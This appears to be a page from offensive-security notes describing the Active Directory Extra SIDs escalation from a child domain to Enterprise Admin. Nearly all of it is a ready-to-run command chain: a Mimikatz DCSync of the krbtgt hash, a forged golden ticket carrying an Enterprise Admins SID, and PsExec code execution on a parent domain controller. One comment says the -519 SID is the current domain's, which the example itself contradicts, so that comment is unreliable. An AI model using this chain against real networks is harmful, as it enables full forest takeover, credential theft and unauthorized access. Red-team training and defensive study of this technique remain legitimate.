# Extra SIDs

## Summary

If we compromise the _krbtgt_ account password of our current domain, we can craft a golden ticket that contains an ExtraSid with group membership of Enterprise Admins.

{% code overflow="wrap" %}
```powershell
# Obtain krbtgt hash with DCSync
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
# Find domain SIDs
Get-DomainSID -Domain prod.corp1.com
Get-DomainSid -Domain corp1.com
# Craft a golden ticket with ExtraSid (sids: value is current domain SID appended with '-519' )
kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-3776646582-2086779273-4091361643 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-1095350385-1831131555-2412080359-519 /ptt
# Get code execution on RDC01
c:\tools\SysinternalsSuite\PsExec.exe \\rdc01 cmd
# Verify Enterprise Admin group membership
whoami /groups
```
{% endcode %}
